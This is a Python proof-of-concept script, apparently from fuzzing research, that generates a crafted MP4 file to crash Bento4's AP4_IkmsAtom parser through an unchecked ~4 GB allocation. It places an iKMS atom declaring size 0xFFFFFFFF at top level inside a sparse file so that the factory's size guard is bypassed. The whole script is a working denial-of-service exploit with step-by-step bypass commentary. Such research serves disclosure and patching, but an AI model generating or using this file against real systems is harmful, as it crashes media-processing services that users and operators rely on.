#!/usr/bin/env python3
"""
vuln_001_gen.py
Generates a crafted MP4 file to trigger CWE-789 in Bento4's AP4_IkmsAtom
constructor (Ap4IkmsAtom.cpp lines 77-92).

Root cause:
  string_size = size - AP4_FULL_ATOM_HEADER_SIZE  [no upper-bound check]
  new char[string_size]  ->  std::bad_alloc -> std::terminate -> crash (DoS)

The atom factory guards against obviously-oversized atoms with:
  if (size > bytes_available) return AP4_ERROR_INVALID_FORMAT;

To bypass this guard the iKMS atom is placed at the TOP LEVEL of the file
(as a direct child of the file, not nested in a container). The factory
computes bytes_available = stream_size - current_position for top-level atoms.
A sparse file of just over 4 GB makes stream_size >> 0xFFFFFFFF so
the guard passes and AP4_IkmsAtom::Create(0xFFFFFFFF, ...) is reached.

Sparse files on Linux use near-zero actual disk blocks.
"""

import struct
import os

OUTPUT_DIR = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4IkmsAtom_h"
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "vuln_001.mp4")

# Required minimum stream size so that bytes_available >= iKMS.size when
# the parser position is 16 (after the 16-byte ftyp box):
#   bytes_available = stream_size - 16 >= 0xFFFFFFFF
#   => stream_size  >= 0xFFFFFFFF + 16 + 1  = 0x100000010
SPARSE_SIZE = 0x100010000   # ~4.00006 GB  (well above the minimum)

def box(box_type, content):
    """Standard box: 4-byte big-endian size + 4-byte type + content."""
    if isinstance(box_type, str):
        box_type = box_type.encode('ascii')
    size = 8 + len(content)
    return struct.pack('>I4s', size, box_type) + content


# ---- ftyp box (16 bytes) ----
ftyp = box('ftyp', b'isom' + struct.pack('>I', 0) + b'isom')

# ---- iKMS ATTACK BOX (12 bytes written; declared size = 0xFFFFFFFF) ----
#
# Layout that the parser sees (after reading these 12 bytes from the file):
#   size_32  = 0xFFFFFFFF  <- declared atom size; triggers massive allocation
#   type     = 'iKMS'      <- routes to AP4_IkmsAtom::Create()
#   [version=0, flags=0]   <- 4 bytes read by ReadFullHeader(); version<=1 check passes
#
# Inside AP4_IkmsAtom constructor:
#   string_size = 0xFFFFFFFF - 12  = 0xFFFFFFF3  (~4 GB)
#   new char[0xFFFFFFF3]           -> std::bad_alloc -> std::terminate -> crash
#
ikms_attack = struct.pack('>I4sI', 0xFFFFFFFF, b'iKMS', 0)   # 12 bytes

# ---- assemble the file (top-level: ftyp then iKMS attack) ----
header_bytes = ftyp + ikms_attack   # 16 + 12 = 28 bytes at the start

os.makedirs(OUTPUT_DIR, exist_ok=True)
with open(OUTPUT_FILE, 'wb') as f:
    # Write the real content at the beginning
    f.write(header_bytes)
    # Seek to SPARSE_SIZE - 1 and write one byte to set the reported file size.
    # On Linux ext3/ext4 (and xfs) this creates a sparse file: the OS reports
    # file size = SPARSE_SIZE bytes but uses near-zero actual disk blocks.
    # Reading the sparse region returns zeros, which the parser never reaches
    # because the crash occurs while processing the iKMS atom.
    f.seek(SPARSE_SIZE - 1)
    f.write(b'\x00')

actual_size = os.path.getsize(OUTPUT_FILE)
print(f"[+] Written to {OUTPUT_FILE}")
print(f"[+] Reported file size : {actual_size} bytes ({actual_size:#x})")
print(f"[+] iKMS declared size : 0xFFFFFFFF")
print(f"[+] bytes_available at iKMS: {actual_size - 16:#x}  (>= 0xFFFFFFFF: {actual_size - 16 >= 0xFFFFFFFF})")
print(f"[+] Expected crash: new char[0xFFFFFFF3] -> std::bad_alloc -> std::terminate")
